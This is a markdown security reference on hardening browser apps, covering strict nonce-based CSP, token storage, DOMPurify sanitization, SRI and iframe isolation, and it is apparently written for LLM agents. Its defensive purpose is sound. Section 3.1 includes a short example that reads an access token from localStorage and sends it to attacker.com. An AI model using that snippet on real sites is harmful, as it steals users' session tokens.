# Client-Side Security Architecture

> **Knowledge Domain:** Frontend Security, CSP, XSS Prevention, Secure Storage  
> **Purpose:** Client-side security hardening for SPAs and modern web applications  
> **Target:** LLM agents securing browser-based applications  
> **Version:** 1.0  

---

## Table of Contents

1. [Modern Client-Side Threat Landscape](#1-modern-client-side-threat-landscape)
2. [Content Security Policy (CSP)](#2-content-security-policy-csp)
3. [Secure Storage Patterns for Authentication Tokens](#3-secure-storage-patterns-for-authentication-tokens)
4. [HTML Sanitization and XSS Prevention](#4-html-sanitization-and-xss-prevention)
5. [Supply Chain Risk Mitigation](#5-supply-chain-risk-mitigation)
6. [AI in Client-Side Security](#6-ai-in-client-side-security)

---

## 1. Modern Client-Side Threat Landscape

**Keywords:** `client-side-security`, `SPA`, `frontend-security`, `XSS`, `supply-chain-risk`, `DOM-security`, `browser-security`

**Overview:** Evolution from server-centric models to SPAs and hybrid frameworks (Next.js) shifted security perimeter. Backend defenses (parameterized queries, access controls) offer little protection against browser-targeted threats.

**Core Principle:** Modern frontend is hostile execution environment where untrusted third-party code runs alongside sensitive business logic, processing authentication tokens and user data in memory.

---

### 1.1 Cross-Site Scripting (XSS): The Persistent Adversary

**Keywords:** `XSS`, `cross-site-scripting`, `DOM-based-XSS`, `mutation-XSS`, `mXSS`, `dangerouslySetInnerHTML`, `escape-hatches`

**Prevalence:** Most prevalent and critical vulnerability in frontend development.

**Modern Framework Protection:**
- React and Vue provide automatic escaping
- XSS persists through "escape hatches"

**XSS Variants:**

**DOM-based XSS:**
- Executes entirely within browser without reaching server
- Occurs when script writes attacker-controlled data to "sink"
- Sinks: `innerHTML`, `eval()`

**Mutation XSS (mXSS):**
- Sophisticated attack
- Browser's HTML parsing engine tricked into mutating seemingly harmless string
- Mutation occurs into executable script after sanitization

**Implications of Successful XSS:**
- Total compromise of client session
- Exfiltrate storage
- Perform actions on behalf of user (CSRF bypass)
- Gateway for further exploitation

### 1.2 Supply Chain and Third-Party Risk

**Keywords:** `supply-chain-risk`, `third-party-scripts`, `Magecart`, `dependency-risk`, `script-injection`

**Modern Application Reality:**
- Applications assembled from hundreds of dependencies
- Third-party scripts for analytics, advertising, customer support
- Scripts execute with same privileges as first-party code

**Attack Vector:**
- Advertising network or utility library compromised
- High-profile Magecart attacks
- Malicious code injected directly into user session
- Skim credit card details or credentials

### 1.3 The AI Code Generation Paradox

**Keywords:** `AI-code-generation`, `GitHub-Copilot`, `ChatGPT`, `vulnerable-boilerplate`, `insecure-patterns`

**Risk Introduction:**
- AI coding assistants increase velocity
- Prioritize functionality over security

**Research Findings:**
- AI models trained on open-source code containing insecure patterns
- Frequently suggest vulnerable implementations by default

**Common AI-Generated Vulnerabilities:**
- Using `dangerouslySetInnerHTML` to render blog post without sanitization
- Implementing token storage using `localStorage` for simplicity
- Ignoring security implications

---

## 2. Content Security Policy (CSP)

**Keywords:** `CSP`, `content-security-policy`, `strict-CSP`, `nonce`, `hash`, `allowlist`, `browser-enforced-firewall`

**Overview:** Cornerstone of client-side defense. Browser-enforced firewall restricting page capabilities to declared allowlists.

---

### 2.1 Evolution from Allowlist to Strict CSP

**Keywords:** `CSP-Level-3`, `domain-allowlist`, `cryptographic-verification`, `strict-dynamic`, `backward-compatibility`

**Early CSP (Level 1 and 2) Limitations:**
- Relied on allowlisting specific domains
- Example: `script-src https://analytics.google.com`
- Fragile and insecure

**Allowlist Bypass Methods:**
- Trusted domain hosts open redirect
- JSONP endpoint available
- User-generated content allowed

**Operational Burden:**
- Maintaining lists in complex applications with shifting dependencies

**Strict CSP Solution:**
- Abandons domain allowlists
- Cryptographic verification via **nonces** or **hashes**

#### 2.1.1 The Nonce-Based Architecture

**Keywords:** `nonce-based-CSP`, `cryptographically-strong-random-token`, `strict-dynamic`, `fallbacks`

**Implementation:**
- Server generates cryptographically strong, random token for each HTTP response
- Token placed in CSP header
- Must be added as attribute to every authorized `<script>` tag

**CSP Header Example:**
```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-rAnd0mStr1ng' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'none';
```

**Directive Explanations:**

| Directive | Purpose |
|-----------|---------|
| `'nonce-{RANDOM}'` | Browser executes only scripts with matching nonce attribute |
| `'strict-dynamic'` | Trusted script (via nonce) can load child scripts automatically |
| `https:` | Fallback for older browsers |
| `'unsafe-inline'` | Fallback for older browsers (ignored when nonce present) |

**'strict-dynamic' Game-Changer (CSP Level 3):**
- If script trusted via nonce, any script it loads also trusted
- Automatically handles dependency trees
- No explicit allowlisting of origins required

**Fallback Behavior:**
- CSP Level 3 compliant browsers: nonce causes `unsafe-inline` to be ignored, `strict-dynamic` causes protocol sources to be ignored
- Older browsers: fallbacks ensure functionality

### 2.2 Implementing Strict CSP in Modern Frameworks (Next.js)

**Keywords:** `Next.js`, `SSR`, `middleware`, `nonce-generation`, `header-injection`, `context-propagation`, `SSG-limitation`

**Complexity:** Nonces in SSR frameworks like Next.js - page cannot be purely static; nonce must be regenerated for every request.

**Implementation Strategy:**

1. **Middleware Generation:**
   - Generate secure nonce in middleware or server entry point
   - Use cryptographic library: `crypto.randomUUID()`

2. **Header Injection:**
   - Inject nonce into Content-Security-Policy header of HTTP response

3. **Context Propagation:**
   - Pass nonce to application context
   - Framework attaches nonce to underlying script tags for hydration

4. **Component Usage:**
   - Custom scripts via `next/script` automatically get nonce
   - Framework handles nonce appending when configured correctly

**SSG Impact - Critical Note:**
- Strict nonce-based CSP **incompatible** with full Static Site Generation (SSG)
- Nonce would become stale and reused
- Document shell must be dynamically rendered or edge-rendered for nonce uniqueness

### 2.3 Hardening Beyond Scripts

**Keywords:** `object-src`, `base-uri`, `frame-ancestors`, `clickjacking`, `plugin-security`

**Additional CSP Directives:**

| Directive | Value | Purpose |
|-----------|-------|---------|
| `object-src 'none'` | Disables plugins | Removes Flash legacy attack surface |
| `base-uri 'none'` | Prevents base tag injection | Stops hijacking of relative URL resolutions |
| `frame-ancestors 'none'` | Superior to X-Frame-Options | Prevents Clickjacking by disallowing iframe embedding |

---

## 3. Secure Storage Patterns for Authentication Tokens

**Keywords:** `token-storage`, `JWT-storage`, `localStorage`, `sessionStorage`, `HttpOnly-cookies`, `in-memory-storage`

**Overview:** Decision of where to store sensitive authentication data (Access Tokens/JWTs) is most debated topic in frontend security.

**Storage Options:**
- localStorage
- sessionStorage
- HttpOnly Cookies
- In-Memory storage

---

### 3.1 The Vulnerability of Web Storage (Local/Session)

**Keywords:** `web-storage`, `XSS-vulnerability`, `token-exfiltration`, `JavaScript-accessible`, `indefinite-persistence`

**Fatal Flaw:** Accessible via JavaScript `window` object.

**Attack Vector:**
```javascript
const token = localStorage.getItem('access_token');
fetch('https://attacker.com', { body: token });
```
- If XSS achieved, exfiltration is trivial and silent

**Persistence Risk:**
- localStorage persists indefinitely
- Widens window of opportunity for attacker
- Risk remains after user leaves application

**Verdict:** Storing sensitive tokens in Web Storage is **insecure** and should be avoided for high-value applications.

### 3.2 HttpOnly Cookies: The Standard Defense

**Keywords:** `HttpOnly-cookies`, `XSS-mitigation`, `document.cookie`, `automatic-attachment`, `CSRF-risk`, `SameSite`

**Design Purpose:** Mitigate XSS-based token theft.

**Mechanism:**
- Cookie flagged as HttpOnly
- Browser hides from JavaScript engine
- `document.cookie` will not reveal it
- Automatically attaches to eligible HTTP requests

**XSS Mitigation:**
- Attacker executing script cannot read token
- Can still make requests (browser's automatic cookie attachment)
- Cannot exfiltrate token to separate device or session

**CSRF Risk:**
- Cookies attached automatically → CSRF risk
- Mitigation: `SameSite` attribute
  - `Lax` or `Strict` prevents cookie on cross-site requests
  - Prevents third-party initiated requests

### 3.3 Advanced Pattern: In-Memory Storage with Refresh Token Rotation

**Keywords:** `in-memory-storage`, `refresh-token-rotation`, `BFF-pattern`, `backend-for-frontend`, `token-lifecycle`

**Hybrid Approach for Maximum Security:**

**Access Token:**
- Store in JavaScript variable (in-memory)
- Lost on page refresh
- Requires re-authentication or token refresh

**Refresh Token:**
- Store in HttpOnly cookie
- Used to obtain new access token when needed

**Backend-for-Frontend (BFF) Pattern:**
- Dedicated backend service handles token exchange
- Client never sees refresh token directly
- BFF manages token lifecycle and rotation

**Benefits:**
- XSS cannot steal access token from memory (no persistent storage)
- Refresh token protected by HttpOnly
- Even if XSS occurs, window of exploitation limited to current session

---

## 4. HTML Sanitization and XSS Prevention

**Keywords:** `HTML-sanitization`, `DOMPurify`, `sanitize-html`, `allowlist`, `blocklist`, `mXSS-prevention`

**Overview:** When HTML must be rendered from untrusted sources (user-generated content, CMS), sanitization is mandatory.

---

### 4.1 Allowlist vs. Blocklist Approaches

**Keywords:** `allowlist-approach`, `blocklist-approach`, `tag-allowlist`, `attribute-allowlist`, `CSS-allowlist`

**Blocklist (Anti-pattern):**
- Attempts to remove dangerous tags/attributes
- Example: Remove `<script>` tags
- Problem: Attackers constantly find new attack vectors
- Incomplete protection

**Allowlist (Recommended):**
- Only allows known-safe tags and attributes
- Default deny stance
- Examples: `<p>`, `<strong>`, `<em>`, `<a>` (with href validation)
- CSS properties also allowlisted

### 4.2 Trusted Libraries

**Keywords:** `DOMPurify`, `sanitize-html`, `battle-tested`, `mXSS-protection`

**Recommended Libraries:**
- **DOMPurify:** Fast, battle-tested, prevents mXSS
- **sanitize-html:** Configurable allowlists for Node.js

**Never Implement Custom Sanitization:**
- Browser parsing engines are complex
- Easy to miss edge cases
- mXSS attacks exploit parsing differences

---

## 5. Supply Chain Risk Mitigation

**Keywords:** `supply-chain-security`, `Subresource-Integrity`, `SRI`, `hash-verification`, `third-party-isolation`, `dependency-audit`

**Overview:** Third-party scripts execute with same privileges as first-party code. Compromised dependencies = direct code injection.

---

### 5.1 Subresource Integrity (SRI)

**Keywords:** `SRI`, `Subresource-Integrity`, `cryptographic-hash`, `integrity-attribute`, `CDN-security`

**Mechanism:**
- Include cryptographic hash of expected script content
- Browser verifies downloaded script matches hash
- If compromised (different content), browser refuses execution

**Implementation:**
```html
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-{HASH}"
        crossorigin="anonymous"></script>
```

**Benefits:**
- Protects against CDN compromise
- Detects man-in-the-middle attacks
- Ensures expected code execution

### 5.2 Dependency Isolation

**Keywords:** `iframe-sandboxing`, `postMessage`, `principle-of-least-privilege`, `third-party-isolation`

**Strategy:**
- Load untrusted third-party scripts in sandboxed iframes
- Use `postMessage` for controlled communication
- Limits damage from compromised scripts

**Implementation:**
```html
<iframe sandbox="allow-scripts" src="third-party.html"></iframe>
```

---

## 6. AI in Client-Side Security

**Keywords:** `AI-security-tools`, `automated-remediation`, `vulnerability-detection`, `SAST`, `security-enforcement`

**Dual Role of AI:**

**Risk Source:**
- Generates vulnerable boilerplate code
- Trained on insecure patterns
- Prioritizes functionality over security

**Security Tool:**
- Automated vulnerability detection
- Code review for security issues
- Suggest secure alternatives
- Enforce security patterns

**Best Practices:**
- Use AI for security review, not just code generation
- Validate AI suggestions against security standards
- Implement automated security testing in CI/CD

---

## Category Tree Schema

```
1. Client-Side Threat Landscape
   1.1 XSS Variants
       1.1.1 DOM-based XSS
       1.1.2 Mutation XSS (mXSS)
   1.2 Supply Chain Risk
   1.3 AI Code Generation Paradox

2. Content Security Policy (CSP)
   2.1 Strict CSP Architecture
       2.1.1 Nonce-Based Implementation
       2.1.2 strict-dynamic Directive
   2.2 Framework Implementation (Next.js)
   2.3 Additional Hardening Directives

3. Secure Token Storage
   3.1 Web Storage (Insecure)
   3.2 HttpOnly Cookies (Standard)
   3.3 In-Memory + Refresh Token Rotation (Advanced)

4. HTML Sanitization
   4.1 Allowlist Approach
   4.2 Trusted Libraries (DOMPurify, sanitize-html)

5. Supply Chain Mitigation
   5.1 Subresource Integrity (SRI)
   5.2 Dependency Isolation

6. AI in Security
   6.1 Risk Source
   6.2 Security Tool
```

---

## Quick Reference: CSP Directives

| Directive | Recommended Value | Purpose |
|-----------|-------------------|---------|
| `default-src` | `'self'` | Default fallback |
| `script-src` | `'nonce-{RANDOM}' 'strict-dynamic'` | Script execution control |
| `style-src` | `'self' 'unsafe-inline'` | Stylesheet sources |
| `img-src` | `'self' data: https:` | Image sources |
| `connect-src` | `'self'` | XHR/WebSocket destinations |
| `font-src` | `'self'` | Font sources |
| `object-src` | `'none'` | Plugin control |
| `base-uri` | `'none'` | Base tag control |
| `frame-ancestors` | `'none'` | Clickjacking prevention |

---

## Quick Reference: Token Storage Security Matrix

| Storage | XSS Protection | Persistence | CSRF Risk | Complexity |
|---------|---------------|-------------|-----------|------------|
| localStorage | None | Indefinite | No | Low |
| sessionStorage | None | Session | No | Low |
| HttpOnly Cookie | High | Configurable | Yes (mitigable) | Medium |
| In-Memory + Refresh | Maximum | Session only | No | High |
